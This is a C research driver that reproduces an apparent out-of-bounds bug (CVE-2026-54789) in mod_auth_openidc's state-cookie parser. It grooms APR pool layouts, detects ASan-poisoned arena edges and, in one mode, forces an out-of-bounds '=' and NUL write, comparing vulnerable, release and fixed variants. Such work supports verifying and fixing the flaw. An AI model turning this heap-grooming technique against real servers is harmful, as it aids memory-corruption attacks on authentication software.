/* Real-object probe for CVE-2026-54789 / GHSA-vgr5-qcpp-x2pr.
 *
 * NOT the validated direct-call harness (../harness/driver.c). This driver
 * keeps oidc_state_cookies_parse_token() and the state-cookie struct VERBATIM
 * from the pinned blobs, but replaces the stubbed request with a real Apache
 * request_rec, a real apr_pool_t, a real apr_table_t Cookie header, a real
 * apr_pstrdup() token and a real apr_strtok() split. The prefix getter and
 * oidc_state_cookies_process_one() recorder remain local stand-ins: no full
 * mod_auth_openidc module, OIDC config, listener, socket or wire is present.
 *
 * Modes:
 *   sweep            find pool layouts where the byte after the token is
 *                    ASan-poisoned (arena block edge); no OOB dereference.
 *   read FILL        call the verbatim parser on an arena token after grooming.
 *   write FILL GAP   plain-build only: place '=' at token_len+GAP, call parser.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <apr.h>
#include <apr_pools.h>
#include <apr_strings.h>
#include <apr_tables.h>
#include <httpd.h>

#ifdef __SANITIZE_ADDRESS__
#include <sanitizer/asan_interface.h>
#endif

typedef struct oidc_cfg_t oidc_cfg_t;
struct oidc_state_cookies_t;

#define OIDC_CHAR_SPACE ' '
#define OIDC_CHAR_EQUAL '='
#define OIDC_STR_SEMI_COLON ";"

static const char *g_prefix = "mod_auth_openidc_state_";
static char *g_token = "mod_auth_openidc_state_novalue";
static int g_process_calls;
static char g_process_name[128];

static char *_oidc_strstr(const char *h, const char *n) { return strstr(h, n); }

static const char *oidc_cfg_dir_state_cookie_prefix_get(request_rec *r) {
    (void)r;
    return g_prefix;
}

static int oidc_state_cookies_process_one(request_rec *r, const oidc_cfg_t *c,
        char *cookieName, const char *value, const char *currentCookieName,
        struct oidc_state_cookies_t **first, struct oidc_state_cookies_t **last) {
    (void)r; (void)c; (void)value; (void)currentCookieName; (void)first; (void)last;
    g_process_calls++;
    snprintf(g_process_name, sizeof(g_process_name), "%s", cookieName);
    return 1;
}

#ifdef FIXED_VARIANT
#include "fixed/state_struct.inc"
#include "fixed/parse_token.inc"
#define VARIANT_NAME "fixed-8017478"
#elif defined(RELEASE_VARIANT)
#include "release/state_struct.inc"
#include "release/parse_token.inc"
#define VARIANT_NAME "release-v2.4.19.4"
#else
#include "vuln/state_struct.inc"
#include "vuln/parse_token.inc"
#define VARIANT_NAME "vuln-4301b536"
#endif

static void setup(apr_pool_t **pp, request_rec **pr, size_t fill) {
    if (apr_initialize() != APR_SUCCESS) { fprintf(stderr, "APR_INIT_FAILED\n"); exit(99); }
    if (apr_pool_create(pp, NULL) != APR_SUCCESS) { fprintf(stderr, "POOL_FAILED\n"); exit(99); }
    request_rec *r = apr_pcalloc(*pp, sizeof(*r));
    r->pool = *pp;
    r->headers_in = apr_table_make(*pp, 4);
    apr_table_add(r->headers_in, "Cookie", g_token);
    if (fill) apr_pcalloc(*pp, fill);
    *pr = r;
}

static char *arena_token(request_rec *r) {
    const char *hdr = apr_table_get(r->headers_in, "Cookie");
    if (hdr == NULL) { fprintf(stderr, "NO_COOKIE_HEADER\n"); exit(98); }
    return apr_pstrdup(r->pool, hdr);
}

static void parse(request_rec *r, char *cookies) {
    char *ctx = NULL;
    char *token = apr_strtok(cookies, OIDC_STR_SEMI_COLON, &ctx);
    if (token == NULL) { fprintf(stderr, "NO_TOKEN\n"); exit(97); }
    int rc = oidc_state_cookies_parse_token(r, NULL, token, NULL, NULL, NULL);
    printf("VARIANT=%s RC=%d PROCESS_CALLS=%d\n", VARIANT_NAME, rc, g_process_calls);
}

static void do_read(size_t fill) {
    apr_pool_t *p; request_rec *r;
    setup(&p, &r, fill);
    char *tok = arena_token(r);
    size_t len = strlen(tok);
    unsigned char before[128];
    size_t safe = len + 64 < sizeof(before) ? len + 64 : sizeof(before);
#ifdef __SANITIZE_ADDRESS__
    size_t off;
    for (off = 0; off <= len + 64; off++) {
        if (__asan_address_is_poisoned(tok + off)) break;
    }
    if (off < safe) safe = off;
    printf("TOKEN_LEN=%zu FIRST_POISON_OFFSET=%zu POISON_AT_TOKEN_END=%d\n",
           len, off, off == len);
#endif
    for (size_t i = 0; i < safe; i++) before[i] = (unsigned char)tok[i];
    for (size_t i = len + 1; i < safe; i++) {
        if (before[i] == (unsigned char)OIDC_CHAR_EQUAL) {
            printf("EQ_IN_POOL_OFFSET=%zu\n", i);
            break;
        }
    }
    parse(r, tok);
    for (size_t i = 0; i < safe; i++) {
        if ((unsigned char)tok[i] != before[i]) {
            printf("FIRST_MUTATION_OFFSET=%zu OLD=%02x NEW=%02x\n",
                   i, before[i], (unsigned char)tok[i]);
            break;
        }
    }
    apr_pool_destroy(p);
    apr_terminate();
}

static void do_sweep(void) {
    size_t hits = 0;
    /* Coarse then fine: APR's default arena block is ~8192 bytes. */
    for (size_t fill = 0; fill <= 12288 && hits < 12; fill++) {
        apr_pool_t *p; request_rec *r;
        setup(&p, &r, fill);
        char *tok = arena_token(r);
        size_t len = strlen(tok);
#ifdef __SANITIZE_ADDRESS__
        if (__asan_address_is_poisoned(tok + len)) {
            printf("HIT FILL=%zu TOKEN_LEN=%zu POISON=%zu\n", fill, len, len);
            hits++;
        }
#endif
        apr_pool_destroy(p);
        apr_terminate();
    }
    printf("HITS=%zu\n", hits);
}


static void do_write(size_t fill, size_t gap) {
    apr_pool_t *p; request_rec *r;
    setup(&p, &r, fill);
    char *tok = arena_token(r);
    size_t len = strlen(tok);
    char *eq = tok + len + gap;
    unsigned char before = (unsigned char)*eq;
    *eq = OIDC_CHAR_EQUAL;
    printf("TOKEN_LEN=%zu EQ_OFFSET=%zu BYTE_BEFORE=%02x\n", len, gap, before);
    parse(r, tok);
    printf("BYTE_AT_EQ_OFFSET=%02x\n", (unsigned char)(tok[len + gap] + 0u));
    printf("NUL_AT_OFFSET=%zu BYTE_NOW=%02x\n", len + gap, (unsigned char)tok[len + gap]);
    printf("PROCESS_NAME=%s\n", g_process_name);
    apr_pool_destroy(p);
    apr_terminate();
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IOLBF, 0);
    /* W14: MO_TOKEN_LEN builds a value-less state token of chosen length.
     * MO_TOKEN_EQ=1 appends "=1" as the well-formed control. */
    const char *tl = getenv("MO_TOKEN_LEN");
    if (tl) {
        size_t n = (size_t)strtoul(tl, NULL, 10), p = strlen(g_prefix);
        int eq = getenv("MO_TOKEN_EQ") != NULL;
        char *t = malloc(p + n + (eq ? 3 : 1));
        if (!t) return 98;
        memcpy(t, g_prefix, p);
        memset(t + p, 'a', n);
        t[p + n] = eq ? '=' : '\0';
        if (eq) { t[p + n + 1] = '1'; t[p + n + 2] = '\0'; }
        g_token = t;
    }
    if (argc < 2) { fprintf(stderr, "usage: driver sweep|read FILL|write FILL GAP\n"); return 2; }
    if (strcmp(argv[1], "sweep") == 0) { do_sweep(); return 0; }
    if (strcmp(argv[1], "read") == 0 && argc == 3) {
        do_read((size_t)strtoul(argv[2], NULL, 10)); return 0;
    }
    if (strcmp(argv[1], "write") == 0 && argc == 4) {
        do_write((size_t)strtoul(argv[2], NULL, 10), (size_t)strtoul(argv[3], NULL, 10)); return 0;
    }
    return 2;
}
